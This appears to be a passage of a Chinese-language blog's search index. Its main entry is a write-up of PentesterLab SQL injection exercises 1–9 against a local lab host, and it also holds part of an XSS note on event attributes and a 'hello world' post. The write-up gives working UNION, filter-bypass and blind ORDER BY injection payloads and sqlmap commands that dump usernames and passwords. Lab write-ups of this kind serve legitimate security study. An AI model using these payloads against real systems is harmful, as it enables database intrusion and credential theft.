align="left">作用</th></tr></thead><tbody><tr><td align="center">onclick</td><td align="left">元素上发生鼠标点击时触发</td></tr><tr><td align="center">onmousedown</td><td align="left">当元素上按下鼠标按钮时触发</td></tr><tr><td align="center">onmousemove</td><td align="left">当鼠标指针移动到元素上时触发</td></tr><tr><td align="center">onmouseover</td><td align="left">当鼠标指针移动到元素上时触</td></tr><tr><td align="center">onmouseout</td><td align="left">当鼠标指针移出元素时触发</td></tr><tr><td align="center">onmouseup</td><td align="left">当在元素上释放鼠标按钮时触发</td></tr></tbody></table><h2 id="支持事件的HTML常见标签"><a href="#支持事件的HTML常见标签" class="headerlink" title="- 支持事件的HTML常见标签"></a>- 支持事件的HTML常见标签</h2><p>凡是支持事件的HTML标签都是可以弹窗的，在HTML中支持事件属性的标签很多</p><table><thead><tr><th align="center">标签</th><th align="left">作用</th></tr></thead><tbody><tr><td align="center">a</td><td align="left">定义超链接，用于从一张页面链接到另一张页面,最重要的属性是 href 属性，它指示链接的目标</td></tr><tr><td align="center">article</td><td align="left">规定独立的自包含内容一篇文章应有其自身的意义，应该有可能独立于站点的其余部分对其进行分发</td></tr><tr><td align="center">audio</td><td align="left">定义声音，比如音乐或其他音频流</td></tr><tr><td align="center">b</td><td align="left">规定粗体文本</td></tr><tr><td align="center">body</td><td align="left">定义文档的主体，包含文档的所有内容</td></tr><tr><td align="center">br</td><td align="left">只是简单地开始新的一行</td></tr><tr><td align="center">button</td><td align="left">定义一个按钮</td></tr><tr><td align="center">iframe</td><td align="left">会创建包含另外一个文档的内联框架</td></tr><tr><td align="center">img</td><td align="left">向网页中嵌入一幅图像</td></tr><tr><td align="center">select</td><td align="left">可创建单选或多选菜单</td></tr><tr><td align="center">style</td><td align="left">用于为 HTML 文档定义样式信息</td></tr><tr><td align="center">textarea</td><td align="left">标签定义多行的文本输入控件</td></tr><tr><td align="center">video</td><td align="left">定义视频，比如电影片段或其他视频流</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pentestlab-sql-injections</title>
      <link href="/2020/03/08/pentestlab-sql-injections/"/>
      <url>/2020/03/08/pentestlab-sql-injections/</url>
      
        <content type="html"><![CDATA[<p>本文是pentestlab的sql injection模块的write up</p><a id="more"></a><h1 id="pentestlab-sql-injections"><a href="#pentestlab-sql-injections" class="headerlink" title="- pentestlab-sql-injections"></a>- pentestlab-sql-injections</h1><h2 id="example-1"><a href="#example-1" class="headerlink" title="- example 1"></a>- example 1</h2><p>首先观察网址<code>http://192.168.183.130/sqli/example1.php?name=root</code>那我们可以猜测sql语句为<code>select * from table where name=&#39;root&#39;</code>，进行尝试验证猜测<code>root&#39; and &#39;1&#39;=&#39;1</code>页面返回正常，<code>root&#39; and &#39;1&#39;=&#39;2</code>页面为空，至此猜测验证完毕，存在注入点。<br>        接下来使用order by判断该网点可以显示多少字段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root&#39; order by 5 %23 &#x2F;&#x2F;%23是#的url编码，#表示注释</span><br></pre></td></tr></table></figure><p> 发现5的时候正常，6就报错，那么该网页可以显示5个字段，接着判断那些字段可以用来进行注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root&#39; union select 1,2,3,4,5 %23</span><br></pre></td></tr></table></figure><p>结果显示了1,2,3 则前三个字段可以用来进行注入。接下来就是爆出所有的库，利用mysql的information_schema库，这个库存储了所有的库，表，字段等信息。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root&#39; union select group_concat(schema_name),2,3,4,5 from information_schema.schemata %23</span><br></pre></td></tr></table></figure><p>发现就两个库<code>information_schema,exercises</code>，那我们的目标肯定就是exercise库了，接着爆exercise库的表。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root&#39; union select group_concat(table_name),2,3,4,5 from information_schema.tables where table_schema&#x3D;0x657865726369736573 %23</span><br><span class="line">&#x2F;&#x2F; 那一串16进制是exercises的16进制，数据库在存储是很有可能会转化为16进制数字存储，所以查询的时候最好使用16进制</span><br></pre></td></tr></table></figure><p>查询结果就只有user一个表，接下来就是爆user表的字段。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root&#39; union select group_concat(column_name),2,3,4,5 from information_schema.columns where table_name&#x3D;0x7573657273 %23</span><br></pre></td></tr></table></figure><p>发现有<code>id,name,age,groupid,passwd</code>五个字段，我们想要的是<code>name、passwd</code>两个字段，最后查询这两个字段即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root&#39; union select 1,name,passwd,4,5 from users %23</span><br></pre></td></tr></table></figure><p>成功得到所有用户的名字和密码</p><h2 id="example-2"><a href="#example-2" class="headerlink" title="- example 2"></a>- example 2</h2><p>尝试<code>root&#39; and 1=1 %23</code>是，提示<code>error no space</code>即不允许使用空格。一般空格被过滤，可以使用注释符（/**/）和制表符TAB（%a0）代替。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root&#39;&#x2F;**&#x2F;and&#x2F;**&#x2F;&#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure><p>成功，进行下一步，发现只过滤了空格，其他的和上一题没有任何区别，按照上一题的步骤即可。查看源码，发现是正则匹配空格，有就输出error no space</p><h2 id="example-3"><a href="#example-3" class="headerlink" title="- example 3"></a>- example 3</h2><p>这一题和第二题一样，用注释符就可以绕过，步骤也是一样。查看源码，用正则匹配，只能是非空白字符，即不能使用空格和TAB。所以用<code>/**/</code>可以绕过</p><h2 id="example-4"><a href="#example-4" class="headerlink" title="- example 4"></a>- example 4</h2><p>查看URL，发现变成了<code>http://192.168.183.130/sqli/example4.php?id=1</code>这是有字符型变成了数字型。猜测sql语句为<code>select * from table where id=1</code>，测试<code>1 and 1=1</code>，因为原句没有<code>&#39;&#39;</code>所以后面不需要加注释符%23了。测试后，发现没有任何过滤。那之后步骤如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1 order by 5 &#x2F;&#x2F;确定网页可以显示那些字段</span><br><span class="line"></span><br><span class="line">1 union select 1,2,3,4,5  &#x2F;&#x2F;确定那些字段可以用来注入</span><br><span class="line"></span><br><span class="line">1 union select group_concat(schema_name),2,3,4,5 from information_schema.schemata &#x2F;&#x2F;爆库</span><br><span class="line"></span><br><span class="line">1 union select group_concat(table_name),2,3,4,5 from information_schema.tables where </span><br><span class="line">table_schema&#x3D;0x657865726369736573 &#x2F;&#x2F;爆表</span><br><span class="line"></span><br><span class="line">1 union select group_concat(column_name),2,3,4,5 from information_schema.columns where table_name&#x3D;0x7573657273 &#x2F;&#x2F;爆字段</span><br><span class="line"></span><br><span class="line">1 union select 1,name,passwd,4,5 from users &#x2F;&#x2F;查询想要的信息</span><br></pre></td></tr></table></figure><h2 id="example-5"><a href="#example-5" class="headerlink" title="- example 5"></a>- example 5</h2><p>这题依旧是数字型。这一题使用上一题的语句就可以得出结果，不知道过滤了什么。所以看下源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">'/^[0-9]+'</span>),$_GET[<span class="string">"id"</span>])&#123;</span><br><span class="line">       <span class="keyword">die</span>(<span class="string">"ERROR INTEGER REQUIRED"</span>);</span><br><span class="line">&#125;</span><br><span class="line">$sql = <span class="string">"select * from users where id="</span>;</span><br><span class="line">$sql .= $_GET[<span class="string">"id"</span>]</span><br></pre></td></tr></table></figure><p>分析源码，它将id的参数拿来进行正则匹配，它匹配数字开头的纯数字，所以只要id的参数以数字开头，就可以匹配成功，不会执行die函数，但是它后面拼接sql语句的时候，使用的是原id参数，并不是匹配后的id参数，所以才导致了，使用第四题的语句就可以成功。</p><h2 id="example-6"><a href="#example-6" class="headerlink" title="- example 6"></a>- example 6</h2><p>还是数字型，依旧用基本语句进行测试。知道爆库之前的语句都正常，但是爆库语句出错，提示<code>ERROR INTEGER REQUIRED</code>，比较前面测试语句的差别，想到前面一题是匹配开头，那么这一题很有可能是匹配结尾测试<code>1 union select group_concat(schema_name),2,3,4,5 from information_schema.schemata %23 1</code>语句，成功爆库，证明猜想正确。接下来步骤：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1 union select group_concat(schema_name),2,3,4,5 from information_schema.schemata %23 1&#x2F;&#x2F;爆库</span><br><span class="line"></span><br><span class="line">1 union select group_concat(table_name),2,3,4,5 from information_schema.tables where </span><br><span class="line">table_schema&#x3D;0x657865726369736573 %23 1&#x2F;&#x2F;爆表</span><br><span class="line"></span><br><span class="line">1 union select group_concat(column_name),2,3,4,5 from information_schema.columns where table_name&#x3D;0x7573657273 %23 1&#x2F;&#x2F;爆字段</span><br><span class="line"></span><br><span class="line">1 union select 1,name,passwd,4,5 from users %23 1&#x2F;&#x2F;查询想要的信息</span><br></pre></td></tr></table></figure><h2 id="example-7"><a href="#example-7" class="headerlink" title="- example 7"></a>- example 7</h2><p>数字型，依旧用基本语句测试，发现<code>1 and 1=1</code>都报错了，结合前两题，应该是id参数只能纯数字，但是这样的话就没办法注入了，所以我们加个<code>\n(%0a)</code>换行符，试试<code>1%0a and 1=1</code>，这样第一行就是纯数字了，测试，成功，看来如果id参数多行的话只需要有一行纯数字就可以绕过过滤，那么后续步骤如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1%0a order by 5 &#x2F;&#x2F;确定网页可以显示那些字段</span><br><span class="line"></span><br><span class="line">1%0a union select 1,2,3,4,5  &#x2F;&#x2F;确定那些字段可以用来注入</span><br><span class="line"></span><br><span class="line">1%0a union select group_concat(schema_name),2,3,4,5 from information_schema.schemata &#x2F;&#x2F;爆库</span><br><span class="line"></span><br><span class="line">1%0a union select group_concat(table_name),2,3,4,5 from information_schema.tables where </span><br><span class="line">table_schema&#x3D;0x657865726369736573 &#x2F;&#x2F;爆表</span><br><span class="line"></span><br><span class="line">1%0a union select group_concat(column_name),2,3,4,5 from information_schema.columns where table_name&#x3D;0x7573657273 &#x2F;&#x2F;爆字段</span><br><span class="line"></span><br><span class="line">1%0a union select 1,name,passwd,4,5 from users &#x2F;&#x2F;查询想要的信息</span><br></pre></td></tr></table></figure><h2 id="example-8"><a href="#example-8" class="headerlink" title="- example 8"></a>- example 8</h2><p>本题变成了order by 注入，因为order by 后面接的是name，所以先要测试原句的引号是哪种。测试以后发现是 ` (反单引号)，之后就开始order by注入。order by 注入是暴力破解，要慢慢猜。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name&#96;,(select 1 regexp if(substring((select concat(table_name)from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1)&#x3D;0x75,1,0x00)) %23</span><br></pre></td></tr></table></figure><p>我们首先来分析这串语句，首先最里面的括号的语句是<code>(select concat(table_name)from information_schema.tables where table_schema=database() limit 0,1)</code>，limit前面的语句意思是查询当前数据库下的表明，limit的作用是结果有多个是，限制输出的个数<code>limit 0,1</code>的0代表第一个(首位为0)，1代表数量，所以整个的意思是取从首位开始的1个结果，所以整个语句的返回结果就是当前数据库下的第一个表名<br>       接着看向第二个括号<code>substring(~,1,1)</code> 代表刚刚分析的那个语句，substring函数的作用是截取字符串，第一个数字表示开始位(从1开始)，第二个数字表示截取长度，所以整句话的意思是取表名的第一个字母<br>        第三个括号是<code>if(~=0x75,1,0x00)</code> 0x75是字母u的16进制，sql语句的<code>if(a,b,c)</code>的意思是，如果a为真，则返回b，否则返回c，所以如果表名的第一个字母是u，则返回值是1，否则返回0<br>        第四个括号<code>select 1 regexp ~</code> regexp在sql语句是正则的意思，如果返回值是1，那么1可以匹配1，整个的值为真，所以order by语句为真，就可以执行，如何返回值为0，因为1不匹配0，所以整个的值为假，order by语句为假，所以整个sql语句不能执行会报错。<br>         就是通过这种方法慢慢猜。另外，因为order by语句中不能出现空格和=，所以要用+代替空格，=要用URL编码替代，即%3d。所以正确的注入语句为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name&#96;,(select+1+regexp+if(substring((select+concat(table_name)from+information_schema.tables+where+table_schema%3ddatabase()+limit+0,1),1,1)&#x3D;0x75,1,0x00)) %23</span><br></pre></td></tr></table></figure><p>就这样慢慢猜，按照表名、字段名、然后再猜字段值<br>       本题没有任何过滤，所以可以使用sqlmap跑</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;192.168.183.130&#x2F;sqli&#x2F;example8.php?order&#x3D;id&quot; -p &quot;order&quot; --prefix &quot;%60&quot; --suffix &quot;%23&quot; --dbs --batch  &#x2F;&#x2F;爆库 本题网址可以按照name、id、age三个参数排序，但是name的sqlmap跑不出来，id和age都可以。-p 后面接传参的参数，本题的参数是order --prefix 是自定义开头 这里的%60是反单引号的URL编码 --suffix 是自定义尾部 %23是#的URL编码 --batch是以默认回复爆破过程中sqlmap的问题</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;192.168.183.130&#x2F;sqli&#x2F;example8.php?order&#x3D;id&quot; -p &quot;order&quot; --prefix &quot;%60&quot; --suffix &quot;%23&quot; --tables -D &quot;exercises&quot; --batch  &#x2F;&#x2F;爆表</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;192.168.183.130&#x2F;sqli&#x2F;example8.php?order&#x3D;id&quot; -p &quot;order&quot; --prefix &quot;%60&quot; --suffix &quot;%23&quot; --columns -T &quot;users&quot; -D &quot;exercises&quot; --batch &#x2F;&#x2F;爆字段</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;192.168.183.130&#x2F;sqli&#x2F;example8.php?order&#x3D;id&quot; -p &quot;order&quot; --prefix &quot;%60&quot; --suffix &quot;%23&quot; -C &quot;name,passwd&quot; --dump -T &quot;users&quot; -D &quot;exercises&quot; --batch  &#x2F;&#x2F;爆字段值</span><br></pre></td></tr></table></figure><h2 id="example-9"><a href="#example-9" class="headerlink" title="- example 9"></a>- example 9</h2><p>本题和第8题一样，只不是order的参数从字符变成了数字</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(select+1+regexp+if(substring((select+concat(table_name)from+information_schema.tables+where+table_schema%3ddatabase()+limit+0,1),1,1)&#x3D;0x75,1,0x00)) %23</span><br></pre></td></tr></table></figure><p>一样，慢慢猜。。。<br>       因为本题没有任何过滤，所以可以使用sqlmap跑，步骤如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;192.168.183.130&#x2F;sqli&#x2F;example9.php?order&#x3D;id&quot; --dbs &#x2F;&#x2F;爆库</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;192.168.183.130&#x2F;sqli&#x2F;example9.php?order&#x3D;id&quot; --tables -D &quot;exercises&quot; &#x2F;&#x2F;爆表</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;192.168.183.130&#x2F;sqli&#x2F;example9.php?order&#x3D;id&quot; --columns -T &quot;users&quot; -D &quot;exercises&quot; &#x2F;&#x2F;爆字段</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;192.168.183.130&#x2F;sqli&#x2F;example9.php?order&#x3D;id&quot; -C &quot;name,passwd&quot; --dump -T &quot;users&quot; -D &quot;exercises&quot; &#x2F;&#x2F;爆字段值</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
            <tag> pentestlab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hello world</title>
      <link href="/2020/03/08/hello-world/"/>
      <url>/2020/03/08/hello-world/</url>
      
        <content type="html"><![CDATA[<p>终于有自己的博客了</p><a id="more"></a><p>一步一脚印，折腾了两三天，踩了无数的坑，终于搭好了自己的第一个博客，希望这个博客记录下的点点滴滴，能成为我学习路上的美好回忆<br><img src="1.jpg" alt="1"></p>]]></content>
      
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂谈 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
